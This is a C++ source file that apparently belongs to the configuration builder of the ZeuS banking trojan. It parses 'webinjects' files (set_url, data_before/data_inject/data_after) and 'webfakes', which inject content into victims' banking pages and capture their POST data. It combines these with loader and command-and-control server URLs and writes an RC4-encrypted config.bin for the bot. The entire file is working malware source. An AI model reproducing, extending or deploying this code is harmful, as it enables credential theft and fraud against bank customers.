#include <windows.h>
#include <shlwapi.h>

#include "defines.h"
#include "buildconfig.h"
#include "tools.h"
#include "languages.h"

#include "..\common\mem.h"
#include "..\common\httpinject.h"
#include "..\common\binstorage.h"
#include "..\common\str.h"
#include "..\common\fs.h"
#include "..\common\gui.h"

#define COPYITEM(name, index, tg)if(name > 0){Mem::_copy(cur, pcfgvar->pValues[index], ++name); tmp = name; name = cur - data; cur += tmp; tg.size += tmp;}
#define COPYITEM_WI(name, index)if(name > 0){Mem::_copy(pMCur, args[index], ++name); wTmp = name; name = pMCur - (LPBYTE)pd->wi; pMCur += wTmp; cwi.size += wTmp;}

#define ARG_QUTE_NONE   0
#define ARG_QUTE_NORMAL '\''
#define ARG_QUTE_DOUBLE '\"'

bool __GetArgA(LPSTR pStart, LPSTR pEnd, LPSTR *s, LPSTR *e)
{
  BYTE k = false;
  while(pStart < pEnd && (*pStart == ' ' || *pStart == '\t'))pStart++;
  if(pStart >= pEnd)return false;
  if(*pStart == ARG_QUTE_DOUBLE || *pStart == ARG_QUTE_NORMAL){k = *pStart; pStart++;}
  *s = pStart;
  while(pStart < pEnd)
  {
    if(k != ARG_QUTE_NONE)
    {
      if(*pStart == k)
      {
        *e = pStart - 1;
        return true;
      }
    }

    else if(*pStart == ' ' || *pStart == '\t' || *pStart == ARG_QUTE_DOUBLE || *pStart == ARG_QUTE_NORMAL)
    {
      *e = pStart - 1;
      return true;
    }
    pStart++;
  }
  if(k)return false;
  *e = pStart - 1;
  return true;
}

DWORD __GetArgsA(LPSTR pStart, LPSTR pEnd, LPSTR **ppArgs, LPSTR *ppNewEnd, DWORD dwLimit)
{
  if(pStart == NULL || pStart >= pEnd)return 0;
  DWORD dwArgsCount = 0;
  LPSTR _s, _e = pStart;
  *ppArgs = NULL;

  while(pStart < pEnd && dwArgsCount < dwLimit && __GetArgA(pStart, pEnd, &_s, &_e) && (_s = Str::_CopyExA(_s, _e -_s + 1)))
  {
    if(!(*ppArgs = (LPSTR *)Mem::realloc(*ppArgs, sizeof(LPSTR *) * (dwArgsCount + 1))))break;
    (*ppArgs)[dwArgsCount++] = _s;
    pStart = _e + (_e[1] == '\"' ? 2 : 1);
  }
  if(ppNewEnd)*ppNewEnd = pStart >= pEnd ? NULL : pStart;
  return dwArgsCount;
}

#define WI_DATA_URL         "set_url"
#define WI_DATA_URL_SIZE    (sizeof(WI_DATA_URL) - 1)
#define WI_DATA_BEFORE      "data_before\r\n"
#define WI_DATA_BEFORE_SIZE (sizeof(WI_DATA_BEFORE) - 3)
#define WI_DATA_INJECT      "data_inject\r\n"
#define WI_DATA_INJECT_SIZE (sizeof(WI_DATA_INJECT) - 3)
#define WI_DATA_AFTER       "data_after\r\n"
#define WI_DATA_AFTER_SIZE  (sizeof(WI_DATA_AFTER) - 3)
#define WI_DATA_END         "data_end\r\n"
#define WI_DATA_END_SIZE    (sizeof(WI_DATA_END) - 3)

typedef struct
{
  LPBYTE                  next;
  HttpInject::HEADER     *wi;
  DWORD                   blockCount;
  HttpInject::INJECTBLOCK **beforeBlock;
  HttpInject::INJECTBLOCK **newBlock;
  HttpInject::INJECTBLOCK **afterBlock;
}SNIDATA;

static bool searchNextInject_Tool_is_filled_inject(SNIDATA *pd)
{
  DWORD index = pd->blockCount - 1;
  return (pd->beforeBlock[index] && pd->newBlock[index] && pd->afterBlock[index]);
}

static bool searchNextInject_Tool_alloc_for_next(SNIDATA *pd)
{
  pd->blockCount++;
  if(!Mem::reallocEx(&pd->beforeBlock, pd->blockCount * sizeof(HttpInject::INJECTBLOCK *)))return false;
  if(!Mem::reallocEx(&pd->newBlock,    pd->blockCount * sizeof(HttpInject::INJECTBLOCK *)))return false;
  if(!Mem::reallocEx(&pd->afterBlock,  pd->blockCount * sizeof(HttpInject::INJECTBLOCK *)))return false;
  return true;
}

static void freeWebInject(SNIDATA *pd)
{
  Mem::free(pd->wi);
  Mem::freeArrayOfPointers(pd->beforeBlock, pd->blockCount);
  Mem::freeArrayOfPointers(pd->newBlock,    pd->blockCount);
  Mem::freeArrayOfPointers(pd->afterBlock,  pd->blockCount);
}

static bool searchNextWebInject(LPBYTE data, LPBYTE end, SNIDATA *pd, DWORD flags)
{
  Mem::_zero(pd, sizeof(SNIDATA));

  BYTE step = 0;
  HttpInject::INJECTBLOCK **pudCur;
  LPBYTE pDataStart;
  bool ok = true;

  while(data < end)
  {
    while((*data == ' ' || *data == '\t') && data < end)data++;
    if(data == end)break;

    LPBYTE strEnd  = data;
    while(*strEnd != '\n' && strEnd < end)strEnd++;

    DWORD size = strEnd - data - (strEnd < end ? 1 : 0);
    if(size && *data != ';')
    {
      if(step == 0)
      {
        LPSTR *args = NULL;
        DWORD argCount = 0;
        ok = false;
        if((argCount = __GetArgsA((LPSTR)data, (LPSTR)strEnd - (*(strEnd - 1) == '\r' ? 1 : 0), &args, NULL, 8)) > 0)
        {
          if(argCount < 3 || CWA(kernel32, lstrcmpiA)(WI_DATA_URL, args[0]) != 0)
          {
            Mem::freeArrayOfPointers(args, argCount);
            break;
          }

          HttpInject::HEADER cwi;
          Mem::_zero(&cwi, sizeof(HttpInject::HEADER));

          WORD wTmp = Str::_LengthA(args[2]);
          for(WORD i = 0; i < wTmp; i++)switch(args[2][i])
          {
            case 'P': cwi.flags |= HttpInject::FLAG_REQUEST_POST; break;
            case 'G': cwi.flags |= HttpInject::FLAG_REQUEST_GET; break;
            case 'L': cwi.flags |= HttpInject::FLAG_IS_CAPTURE; break;
            case 'F': cwi.flags |= HttpInject::FLAG_CAPTURE_TOFILE; break;
            case 'H': cwi.flags |= HttpInject::FLAG_CAPTURE_NOTPARSE; break;
            case 'D': cwi.flags |= HttpInject::FLAG_ONCE_PER_DAY; break;
            case 'I': cwi.flags |= HttpInject::FLAG_URL_CASE_INSENSITIVE; break;
            case 'C': cwi.flags |= HttpInject::FLAG_CONTEXT_CASE_INSENSITIVE; break;
          }
          if((cwi.flags & HttpInject::FLAG_IS_CAPTURE) == 0)cwi.flags |= HttpInject::FLAG_IS_INJECT;
          
          cwi.urlMask           = Str::_LengthA(args[1]);
          cwi.postDataBlackMask = (argCount > 3 && !(args[3][0] == '*' && args[3][1] == 0)) ? Str::_LengthA(args[3]) : 0;
          cwi.postDataWhiteMask = (argCount > 4 && !(args[4][0] == '*' && args[4][1] == 0)) ? Str::_LengthA(args[4]) : 0;
          cwi.blockOnUrl        = argCount > 5 ? Str::_LengthA(args[5]) : 0;
          cwi.contextMask       = argCount > 6 ? Str::_LengthA(args[6]) : 0;

          pd->wi = (HttpInject::HEADER *)Mem::alloc(10 + sizeof(HttpInject::HEADER) + cwi.urlMask + cwi.postDataBlackMask + cwi.postDataWhiteMask + cwi.blockOnUrl + cwi.contextMask);
          if(pd->wi == NULL)
          {
            Mem::freeArrayOfPointers(args, argCount);
            break;
          }
          LPBYTE pMCur = (LPBYTE)pd->wi + sizeof(HttpInject::HEADER);

          COPYITEM_WI(cwi.urlMask,           1);
          COPYITEM_WI(cwi.postDataBlackMask, 3);
          COPYITEM_WI(cwi.postDataWhiteMask, 4);
          COPYITEM_WI(cwi.blockOnUrl,        5);
          COPYITEM_WI(cwi.contextMask,       6);

          cwi.size += sizeof(HttpInject::HEADER);
          Mem::_copy(pd->wi, &cwi, sizeof(HttpInject::HEADER));
          Mem::freeArrayOfPointers(args, argCount);

          if(!searchNextInject_Tool_alloc_for_next(pd))break;
          step = 1;
        }
        else break;
      }
      else if(step == 1)
      {
        if(size > WI_DATA_URL_SIZE && CWA(shlwapi, StrCmpNIA)(WI_DATA_URL, (LPSTR)data, WI_DATA_URL_SIZE) == 0 && (data[WI_DATA_URL_SIZE] == ' ' || data[WI_DATA_URL_SIZE] == '\t'))
        {
          pd->next = data;
          break;
        }

        ok = false;
        if(size == WI_DATA_BEFORE_SIZE && CWA(shlwapi, StrCmpNIA)(WI_DATA_BEFORE, (LPSTR)data, WI_DATA_BEFORE_SIZE) == 0)
        {
          pudCur = &((pd->beforeBlock)[pd->blockCount - 1]);
        }
        else if(size == WI_DATA_INJECT_SIZE && CWA(shlwapi, StrCmpNIA)(WI_DATA_INJECT, (LPSTR)data, WI_DATA_INJECT_SIZE) == 0)
        {
          pudCur = &((pd->newBlock)[pd->blockCount - 1]);
        }
        else if(size == WI_DATA_AFTER_SIZE && CWA(shlwapi, StrCmpNIA)(WI_DATA_AFTER, (LPSTR)data, WI_DATA_AFTER_SIZE) == 0)
        {
          pudCur = &((pd->afterBlock)[pd->blockCount - 1]);
        }
        else break;

        pDataStart = strEnd + 1;
        step = 2;
      }
      else if(step == 2)
      {
        if(size == WI_DATA_END_SIZE && CWA(shlwapi, StrCmpNIA)(WI_DATA_END, (LPSTR)data, size) == 0)
        {
          DWORD csize = 0;
          if(data > pDataStart)
          {
            csize = data - pDataStart - 1;
            if(*(data - 2) == '\r')csize--;
          }
          if(csize + sizeof(HttpInject::INJECTBLOCK) >= 0xFFFF || (*pudCur = (HttpInject::INJECTBLOCK *)Mem::alloc(csize + sizeof(HttpInject::INJECTBLOCK))) == NULL)break;

          (*pudCur)->flags = 0;
          (*pudCur)->size = (WORD)(csize + sizeof(HttpInject::INJECTBLOCK));
          Mem::_copy((LPBYTE)(*pudCur) + sizeof(HttpInject::INJECTBLOCK), pDataStart, csize);

          if(searchNextInject_Tool_is_filled_inject(pd))
          {
            if(!searchNextInject_Tool_alloc_for_next(pd))break;
            ok = true;
          }
          step = 1;
        }
      }
    }

    data = strEnd + 1;
  }

  if(!ok)freeWebInject(pd);
  else if(pd->blockCount > 0)pd->blockCount--;

  return ok;
}

static DWORD buildWebInject(HWND output, LPWSTR file, BinStorage::STORAGE **ph, LPBYTE *injectsList, LPDWORD injectsSize, LPDWORD injectsCount)
{
  DWORD totalCount = 0;
  
  Fs::MEMFILE mf;
  if(!Fs::_fileToMem(file, &mf, 0))return Languages::builder_httpinjects_fopen_failed;
  
  DWORD errorMsg = (DWORD)-1; 

  if(mf.size > 0)
  {
    LPBYTE end = (LPBYTE)mf.data + mf.size;
    SNIDATA sd;
    sd.next = (LPBYTE)mf.data;

    bool ok = false;

    while((ok = searchNextWebInject(sd.next, end, &sd, 0)) && sd.blockCount > 0)
    {
      if(!Mem::reallocEx(injectsList, *injectsSize + sd.wi->size))ok = false;
      else
      {
        ok = true;
        Mem::_copy(*injectsList + *injectsSize, sd.wi, sd.wi->size);
        *injectsSize += sd.wi->size;

        DWORD dwCurSize = 0;
        LPBYTE pInjectList = NULL;

        for(DWORD i = 0; i < sd.blockCount; i++)
        {
          if(!Mem::reallocEx(&pInjectList, dwCurSize + sd.beforeBlock[i]->size + sd.newBlock[i]->size + sd.afterBlock[i]->size))
          {
            ok = false;
            break;
          }

          Mem::_copy(pInjectList + dwCurSize, sd.beforeBlock[i], sd.beforeBlock[i]->size); dwCurSize += sd.beforeBlock[i]->size;
          Mem::_copy(pInjectList + dwCurSize, sd.afterBlock[i],  sd.afterBlock[i]->size);  dwCurSize += sd.afterBlock[i]->size;
          Mem::_copy(pInjectList + dwCurSize, sd.newBlock[i],    sd.newBlock[i]->size);    dwCurSize += sd.newBlock[i]->size;
        }

        if(ok)
        {
          writeOutput(output, L"%u=%S", totalCount, (LPBYTE)sd.wi + sd.wi->urlMask);
          ok = BinStorage::_addItem(ph, *injectsCount + (++totalCount), BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_HTTP_INJECT | BinStorage::ITEMF_COMPRESSED, pInjectList, dwCurSize);
          if(!ok)errorMsg = Languages::error_not_enough_memory;
        }
        Mem::free(pInjectList);
      }

      freeWebInject(&sd);

      if(!ok || sd.next == NULL)break;
    }

    if(!ok && errorMsg == (DWORD)-1)errorMsg = Languages::builder_httpinjects_bad_format;
  }

  Fs::_closeMemFile(&mf);

  *injectsCount += totalCount;
  return errorMsg;
}

HttpInject::HEADER *webFake2Binary(Config0::VAR *pcfgvar)
{
  if(pcfgvar->bValuesCount < 3)return NULL;

  HttpInject::HEADER wf;
  wf.size = 0;

  //Flags
  wf.flags = 0;
  WORD tmp = Str::_LengthA(pcfgvar->pValues[2]);
  for(WORD i = 0; i < tmp; i++)switch(pcfgvar->pValues[2][i])
  {
    case 'P': wf.flags |= HttpInject::FLAG_REQUEST_POST; break;
    case 'G': wf.flags |= HttpInject::FLAG_REQUEST_GET; break;
    case 'S': wf.flags |= HttpInject::FLAG_IS_MIRRORFAKE; break;
  }
  if((wf.flags & HttpInject::FLAG_IS_MIRRORFAKE) == 0)wf.flags |= HttpInject::FLAG_IS_FAKE;

  wf.urlMask           = Str::_LengthA(pcfgvar->pValues[0]);
  wf.fakeUrl           = Str::_LengthA(pcfgvar->pValues[1]);
  wf.postDataBlackMask = pcfgvar->bValuesCount > 3 && !(pcfgvar->pValues[3][0] == '*' && pcfgvar->pValues[3][1] == 0) ? Str::_LengthA(pcfgvar->pValues[3]) : 0;
  wf.postDataWhiteMask = pcfgvar->bValuesCount > 4 && !(pcfgvar->pValues[4][0] == '*' && pcfgvar->pValues[4][1] == 0) ? Str::_LengthA(pcfgvar->pValues[4]) : 0;
  wf.blockOnUrl        = pcfgvar->bValuesCount > 5 ? Str::_LengthA(pcfgvar->pValues[5]) : 0;
  wf.contextMask       = 0;

  LPBYTE data = (LPBYTE)Mem::alloc(10 + sizeof(HttpInject::HEADER) + wf.urlMask + wf.fakeUrl + wf.postDataBlackMask + wf.postDataWhiteMask + wf.blockOnUrl + wf.contextMask);
  if(data == NULL)return NULL;
  LPBYTE cur = data + sizeof(HttpInject::HEADER);

  COPYITEM(wf.urlMask,           0, wf);
  COPYITEM(wf.fakeUrl,           1, wf);
  COPYITEM(wf.postDataBlackMask, 3, wf);
  COPYITEM(wf.postDataWhiteMask, 4, wf);
  COPYITEM(wf.blockOnUrl,        5, wf);

  wf.size += sizeof(HttpInject::HEADER);
  Mem::_copy(data, &wf, sizeof(HttpInject::HEADER));

  return (HttpInject::HEADER *)data;
}

static bool childToMultiString(HWND output, BinStorage::STORAGE **ph, Config0::VAR *parent, LPSTR entryName, DWORD cfgID, BYTE valuesCount)
{
  Config0::VAR *pcvc;
  if((pcvc = Config0::_GetVar(parent, NULL, NULL, entryName)) && pcvc->dwChildsCount > 0)
  {
    DWORD count = 0;
    DWORD size = 0;
    LPSTR list = NULL;
    bool error = false;
    DWORD strSize;

    for(DWORD i = 0; i < pcvc->dwChildsCount; i++)
    {
      if(pcvc->pChilds[i].bValuesCount == valuesCount)
      {
        for(BYTE k = 0; k < valuesCount; k++)
        {
          if((strSize = Str::_LengthA(pcvc->pChilds[i].pValues[k])) == 0)
          {
            Mem::free(list);
            return false;
          }

          Str::UTF8STRING u8s;
          if(!Str::_utf8FromAnsi(pcvc->pChilds[i].pValues[k], strSize, &u8s))
          {
            error = true;
            break;
          }

          if(!Mem::reallocEx(&list, size + u8s.size + 2))
          {
            Str::_utf8Free(&u8s);
            error = true;
            break;
          }

          Mem::_copy(list + size, u8s.data, u8s.size + 1);
          size += u8s.size + 1;
          Str::_utf8Free(&u8s);
        }
        writeOutput(output, L"%S[%u]=%S", entryName, count++, pcvc->pChilds[i].pValues[0]);
      }
      else
      {
        Mem::free(list);
        return false;
      }
    }

    if(count > 0 && !error)
    {
      list[++size] = 0;
      error = !BinStorage::_addItem(ph, cfgID, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION | BinStorage::ITEMF_COMPRESSED, list, size);
    }
    Mem::free(list);
    if(error)return false;
  }
  return true;
}

void BuildConfig::init(void)
{

}

void BuildConfig::uninit(void)
{

}

bool BuildConfig::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR destFolder)
{
  DWORD errorMsg = Languages::error_not_enough_memory; //Код ошибки.

  writeOutput(output, Languages::get(Languages::builder_config_begin));

  BinStorage::STORAGE *ph = BinStorage::_createEmpty();
  if(ph == NULL)goto EXIT_BAD;

  //Получаем ключ шифрования.
  LPSTR encryptionKey;
  DWORD encryptionKeySize;
  Config0::VAR *pcv = Config0::_GetVar(NULL, config, NULL, "staticconfig");

  if(pcv == NULL)
  {
    errorMsg = Languages::builder_staticconfig_not_founded;
    goto EXIT_BAD;
  }

  if((pcv = Config0::_GetVar(pcv, NULL, "encryption_key", NULL)) == NULL || pcv->bValuesCount < 2 || (encryptionKeySize = Str::_LengthA(pcv->pValues[1])) < 1)
  {
    errorMsg = Languages::builder_staticconfig_encryption_key_not_founded;
    goto EXIT_BAD;
  }
  encryptionKey = pcv->pValues[1];

  //Открываем DynamicConfig
  if((pcv = Config0::_GetVar(NULL, config, NULL, "dynamicconfig")) == NULL)
  {
    errorMsg = Languages::builder_dynamicconfig_not_founded;
    goto EXIT_BAD;
  }

  Config0::VAR *pcvc;

  //Версия
  {
    DWORD version = BO_CLIENT_VERSION;
    if(!BinStorage::_addItem(&ph, CFGID_LAST_VERSION, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION, &version, sizeof(DWORD)))goto EXIT_BAD;
  }

  //url_loader
  {
    pcvc = Config0::_GetVar(pcv, NULL, "url_loader", NULL);
    if(pcvc == NULL || pcvc->bValuesCount < 2){errorMsg = Languages::builder_dynamicconfig_url_loader_not_founded; goto EXIT_BAD;}
    if(!BinStorage::_addItemAsUtf8StringA(&ph, CFGID_LAST_VERSION_URL, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION, pcvc->pValues[1]))goto EXIT_BAD;
    writeOutput(output, L"url_loader=%S", pcvc->pValues[1]);
  }

  //url_server
  //FIXME: Привязка к хостам.
  pcvc = Config0::_GetVar(pcv, NULL, "url_server", NULL);
  if(pcvc == NULL || pcvc->bValuesCount < 2){errorMsg = Languages::builder_dynamicconfig_url_server_not_founded; goto EXIT_BAD;}
  if(!BinStorage::_addItemAsUtf8StringA(&ph, CFGID_URL_SERVER_0, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION, pcvc->pValues[1]))goto EXIT_BAD;
  writeOutput(output, L"url_server=%S", pcvc->pValues[1]);

  //AdvancedConfigs
  if(!childToMultiString(output, &ph, pcv, "advancedconfigs", CFGID_URL_ADV_SERVERS, 1)){errorMsg = Languages::builder_dynamicconfig_advancedconfigs_error; goto EXIT_BAD;}

#if(BO_WININET > 0)
  //WebFilters
  if(!childToMultiString(output, &ph, pcv, "webfilters", CFGID_HTTP_FILTER, 1)){errorMsg = Languages::builder_dynamicconfig_webfilters_error; goto EXIT_BAD;}
#endif

#if(BO_WININET > 0)
  //WebDataFilters
  if(!childToMultiString(output, &ph, pcv, "webdatafilters", CFGID_HTTP_POSTDATA_FILTER, 2)){errorMsg = Languages::builder_dynamicconfig_webdatafilters_error; goto EXIT_BAD;}
#endif

  DWORD injectsCount = 0;
  DWORD injectsSize  = 0;
  LPBYTE injectsList = NULL;

  //WebFakes
  if((pcvc = Config0::_GetVar(pcv, NULL, NULL, "webfakes")) && pcvc->dwChildsCount > 0)
  {
    for(DWORD i = 0; i < pcvc->dwChildsCount; i++)
    {
      HttpInject::HEADER *pwf = webFake2Binary(&pcvc->pChilds[i]);
      if(pwf == NULL || !Mem::reallocEx(&injectsList, injectsSize + pwf->size))
      {
        errorMsg = Languages::builder_dynamicconfig_webfakes_error;
        Mem::free(pwf);
        Mem::free(injectsList);
        goto EXIT_BAD;
      }

      writeOutput(output, L"webfake[%u]=%S -> %S", i, (LPBYTE)pwf + pwf->urlMask, (LPBYTE)pwf + pwf->fakeUrl);
      Mem::_copy(injectsList + injectsSize, pwf, pwf->size);
      injectsSize += pwf->size;
      injectsCount++;
      Mem::free(pwf);
    }
  }

  //file_webinjects
  if((pcvc = Config0::_GetVar(pcv, NULL, "file_webinjects", NULL)))
  {
    if(pcvc->bValuesCount != 2){errorMsg = Languages::builder_dynamicconfig_file_webinjects_error; goto EXIT_BAD;}
    writeOutput(output, L"file_webinjects=%S", pcvc->pValues[1]);
    WCHAR file[MAX_PATH];
    LPWSTR ptmp = Str::_ansiToUnicodeEx(pcvc->pValues[1], -1);

    if(!ptmp)goto EXIT_BAD;
    Fs::_pathCombine(file, destFolder, ptmp);
    Mem::free(ptmp);

    writeOutput(output, Languages::get(Languages::builder_httpinjects_begin));
    DWORD ee = buildWebInject(output, file, &ph, &injectsList, &injectsSize, &injectsCount);
    if(ee != (DWORD)-1){errorMsg = ee; goto EXIT_BAD;}
  }

  //Пишим инжекты, фейки.
  if(injectsSize > 0)
  {
    bool ok = BinStorage::_addItem(&ph, CFGID_HTTP_INJECTS_LIST, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION | BinStorage::ITEMF_COMPRESSED, injectsList, injectsSize);
    Mem::free(injectsList);
    if(!ok)goto EXIT_BAD;
  }

  //Пишим образ.
  {
    Crypt::RC4KEY key;
    Crypt::_rc4Init(encryptionKey, encryptionKeySize, &key);
   DWORD packSize = BinStorage::_pack(&ph, BinStorage::PACKF_FINAL_MODE, &key);
    if(packSize == NULL)goto EXIT_BAD;

    WCHAR outputFile[MAX_PATH];
    WCHAR file[MAX_PATH];
    LPSTR cfg;

    //Получаем имя файла.
    if((pcv = Config0::_GetVar(NULL, config, NULL, "staticconfig")) && (pcv = Config0::_GetVar(pcv, NULL, "url_config", NULL)) &&
      pcv->bValuesCount > 1 && (cfg = CWA(shlwapi, PathFindFileNameA)(pcv->pValues[1])) && *cfg != 0)
    {
      Str::_ansiToUnicode(cfg, -1, file, MAX_PATH);
    }
    else CWA(kernel32, lstrcpyW)(file, L"config.bin");

    Fs::_pathCombine(outputFile, destFolder, file);

    if(!Gui::_browseForSaveFile(owner, destFolder, outputFile, NULL, NULL, 0) || !Fs::_saveToFile(outputFile, ph, packSize))
    {
      //Fs::_removeFile(outputFile);
      errorMsg = Languages::error_fwrite_failed;
      goto EXIT_BAD;
    }
  }

  Mem::free(ph);
  writeOutput(output, Languages::get(Languages::builder_config_end));
  return true;

EXIT_BAD:
  Mem::free(ph);
  writeOutputError(output, Languages::get(errorMsg));
  return false;
}
